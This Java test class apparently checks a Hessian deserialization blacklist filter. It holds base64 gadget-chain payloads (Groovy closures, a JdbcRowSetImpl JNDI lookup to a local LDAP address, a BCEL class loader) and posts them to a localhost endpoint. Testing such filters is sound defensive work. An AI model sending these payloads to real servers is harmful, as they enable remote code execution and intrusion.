package com.hzk.webserver.filter.hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.hzk.webserver.filter.hessian.CommonRpcParam;
import com.hzk.webserver.filter.hessian.SideEffectObject;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * com.hzk.webserver.filter.hessian.HessianFilter
 * 黑名单测试
 */
public class HessianBugTest {

    public static void main(String[] args) throws Exception {
        method();
    }

    private static void method() throws IOException {
        // javax.swing.UIDefaults, javax.swing.UIDefaults$ProxyLazyValue
//        String payloadBase64 = "SE0WamF2YXguc3dpbmcuVUlEZWZhdWx0cwNhYWFDMCVqYXZheC5zd2luZy5VSURlZmF1bHRzJFByb3h5TGF6eVZhbHVllAljbGFzc05hbWUKbWV0aG9kTmFtZQNhY2MEYXJnc2AwMWNvbS5zdW4ub3JnLmFwYWNoZS5iY2VsLmludGVybmFsLnV0aWwuSmF2YVdyYXBwZXIFX21haW5OcQdbb2JqZWN0cQdbc3RyaW5nUwYaJCRCQ0VMJCQkbCQ4YiRJJEEkQSRBJEEkQSRBJEFtUyRkYlIkZDNQJFUkNWQkYTdNSSQ1YiQ4MmIkYjkkSyQ1ZSRBJFYkNWIkUVIkZGJQJFEkUSQ5NSQ4ZW9VcSQ4MjAkZDUkY2U4JHQkZTFIJDgzaVIkOTNUJGE4JGNmJGZlJDg0XyRjMDMwJEQkOGUkOGMkN2UkODAkZGYkZTQkYTgkM2IkYzUkQiQzYiRmMCQ5MCRiMyRhZmckZWYkYjUkZDckZDkkZjkkZjkkZmIkZGIkUCRBOSR5M1QkNWNvUyRlNXVuViQ4NWokSSRlZTQkQyRjYiRmNlUkZDNtJGJhJDgxUCRiNyQ3YyRkNyRKJDlhdSRhMVokYjUkYmEkYWQkYWUkOTIkYTYkTCRjZiRlMiRiNiRmNUl4JGNiJGRjJFh5JHokNWIkZTAkYjkkODIxZ2okRiRjZCRjOCQ5YkZBJGNiaTMkZDkkYmMkZjZudlYkZTMkODYkOTAkYzEkWSRiYSRiNyRmOEckYWUkZGEkZGMkZDlUXyRZJDViJGMyJE1kRCRaJHEkODMkZWUzJGE0SmdRJDNkJGYwJHlncyQ4MSRuJGVhJDhiJDNhJDlkZm0kODMkYTFjJGQxciRhYyQ2MCQ4OSRjY3RmJDhkJGExJGU3JHkkZmQkZTkkOGUkdiRlYSQ4MSRlNSQzYTIkM2EkViRxJDkwTEJCJFgkODMkZWMkZmEkZDMkTyRhZiQ4OTgkJCRiNzUkZDckOWIkN2UkbWoyJGFlMHRuJDhhJDYwJGM1cyRlYiRjMiRMJDlhJE0kZTMkZTkkZjMkbTIkZTckNWQkS3okZDAkOWJEJEskN2QkZWRlJDViUSRaJERUNnBLJGVlJGI2JGYwJDhhJGFkJGQxeiRkMyRYJFckYjkkOGEkYTEkcSRHMUwkVG0kNWJOJGkkZDckWiRlMiRzJGQxJGNjJHokYzdnJFkkZmUkbEskYjEkY2EkM2QkNWQkN2NoJEkkYzckVSRMJDk5JGQ3JEtuYiRxJGJjJDNiSkMkUzkkZDNiJDg3JDg2JGJjJGE1JG0kODYkOGUkRSRvJGI4JGMzJFFRJGNkOCRlZSR3JDkwTyQzYyRaSlQkTiRjYlEkZmRqJGkkOTMkVSQ5ZSRhMiRmMCQ5NCQ4MiRmOElYZSRZJDNjJGViRiQ4NCQ5OCRjMiRmNyQ5NyRoJDk2JGJkJG4kM2MkWiRmNyRaJGZhJGQzbyQkJGEwZiR6ZCQzYiQ5ZiRhNCRmZCRkMSRZYiQ3ZSRjMCRiZCQ4MCRhMSRhZm0kZGEkN2YkYjVoJGRjJENmJGMzJGNjOSQ5YXIkZDEkYjQkZmYkYmQkZTUkWSRhMSRsUSRjZCRSJDNhJDhiJGYzJDk1VyRiZSRmMCRmYyRjYUokYzMkYjAkeiRiM1IkZTUkZTYkZmIkNDAkZjhBJGkkTEkkODJIJGVmJFokN2IkNWIkcG5oYyQ4YSRlZSRHJGQxJGRhJGE1JEgkOTQkZjIkOGMkZDdXJGI5YSQ5MyQ5ZCQzYyRkZCREJGwkYTN0QyRhMiRjZCQ4ZSRTJDQwJG8kODUkYjRESEVLJGM2JDViMiRLJFckYWUkSyQ5ZCQ4ZiRjOCRmYUwkZDkkUiQ5MiRmYSRjNCRSJCQkYTUkYmEkYmYkYTIkZmYkUSRkN1I3JE8xJGY2JEYkZGQkYTkkZGIkSCRZTyRhNSRQMCRiMSQ4YiRhZSRkNCRiZCRkMCQ5OCRzJGEzJGUzJDNiJEckY2IkZDEkN2QkOGMkZWJlaSRsJFR6OSRiNiQ4ZiRhYyQ1ZSQzYUYkYWUkM2N5JDg0JDk5QyQzY1gkZGYkODVUJGRhJGEzJFckUyQ5ZSRlMyRyJFUkZDIka1MkOTMkQkgkN2YkSSRuJDkzJGMzJDk2JEokZmE3JDk0XyRtdCRTJG4kOWIkM2ZFNCRkNCRjMiREQiRiM3gkODAkZWMxJG8kZTUkcCQzYyQ1YyRkZmskZjkkU1hCJDllJGUyYSQ1ZSRsSSRXJGZhJGRhUyQ5ZSRkMCR0USQ0MCRCJGZlJENUJDdkJF8kNjAkZTUkRCRBJEFaUZFNkANhYWFRklpRlVo=";
        String payloadBase64 = "chFqYXZhLnV0aWwuVHJlZVNldA1nYWRnZXQtY2hhaW5zQxZjb20uc3VuLnByb3h5LiRQcm94eTg1kQFoYEMwLG9yZy5jb2RlaGF1cy5ncm9vdnkucnVudGltZS5Db252ZXJ0ZWRDbG9zdXJllAptZXRob2ROYW1lCGRlbGVnYXRlC2hhbmRsZUNhY2hlCW1ldGFDbGFzc2EJY29tcGFyZVRvQzApb3JnLmNvZGVoYXVzLmdyb292eS5ydW50aW1lLk1ldGhvZENsb3N1cmWZBm1ldGhvZA9yZXNvbHZlU3RyYXRlZ3kJZGlyZWN0aXZlGW1heGltdW1OdW1iZXJPZlBhcmFtZXRlcnMIZGVsZWdhdGUFb3duZXIKdGhpc09iamVjdA5wYXJhbWV0ZXJUeXBlcwNiY3diDGxpc3RCaW5kaW5nc5CQkUMwJ2phdmF4Lm5hbWluZy5zcGkuQ29udGludWF0aW9uRGlyQ29udGV4dJMDY3BlA2Vudgdjb250Q3R4Y0MwI2phdmF4Lm5hbWluZy5DYW5ub3RQcm9jZWVkRXhjZXB0aW9unA1yb290RXhjZXB0aW9uDWRldGFpbE1lc3NhZ2UFY2F1c2UQcmVtYWluaW5nTmV3TmFtZQtlbnZpcm9ubWVudAdhbHROYW1lCmFsdE5hbWVDdHgMcmVzb2x2ZWROYW1lC3Jlc29sdmVkT2JqDXJlbWFpbmluZ05hbWUKc3RhY2tUcmFjZRRzdXBwcmVzc2VkRXhjZXB0aW9uc2ROTk5OTk5OTkMdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGysB2NvbW1hbmQDVVJMCmRhdGFTb3VyY2UKcm93U2V0VHlwZQtzaG93RGVsZXRlZAxxdWVyeVRpbWVvdXQHbWF4Um93cwxtYXhGaWVsZFNpemULY29uY3VycmVuY3kIcmVhZE9ubHkQZXNjYXBlUHJvY2Vzc2luZwlpc29sYXRpb24IZmV0Y2hEaXIJZmV0Y2hTaXplBGNvbm4CcHMCcnMGcm93c01EBXJlc01EDWlNYXRjaENvbHVtbnMPc3RyTWF0Y2hDb2x1bW5zDGJpbmFyeVN0cmVhbQ11bmljb2RlU3RyZWFtC2FzY2lpU3RyZWFtCmNoYXJTdHJlYW0DbWFwCWxpc3RlbmVycwZwYXJhbXNlTk4XbGRhcDovLzEyNy4wLjAuMToxMzg5L3jL7EaQkJDL8FRUksvokE5OTk5OVhBqYXZhLnV0aWwuVmVjdG9ymo+Pj4+Pj4+Pj49WkZpOTk5OTk5OTk5OTk5OTk5wkU0TamF2YS51dGlsLkhhc2h0YWJsZVpOcBxbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50Tk2SWk5RlE5xEFtqYXZhLmxhbmcuQ2xhc3NDD2phdmEubGFuZy5DbGFzc5EEbmFtZWYQamF2YS5sYW5nLlN0cmluZ05NMCZqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50SGFzaE1hcFpO";
        byte[] bytes = Base64.getDecoder().decode(payloadBase64);
        try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes)) {
            Hessian2Input h2i = new Hessian2Input(bis);
            Map map = (Map)h2i.readObject();
            System.out.println(map);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

        String url = "http://localhost:8081/ierp/a.do";
        // apache httpclient
        HttpClient httpClient = HttpClientBuilder.create().useSystemProperties()
                .setDefaultRequestConfig(
                        RequestConfig.custom()
                                .setConnectionRequestTimeout(5000)
                                .setConnectTimeout(5000)
                                .setSocketTimeout(60000).build()
                ).build();
        HttpPost post = new HttpPost(url);
        // ★ 关键：直接用 ByteArrayEntity
        ByteArrayEntity entity = new ByteArrayEntity(bytes);
        entity.setContentType("application/octet-stream");
        post.setEntity(entity);

        HttpResponse execute = httpClient.execute(post);
        System.out.println("status = " + execute.getStatusLine());
    }


}
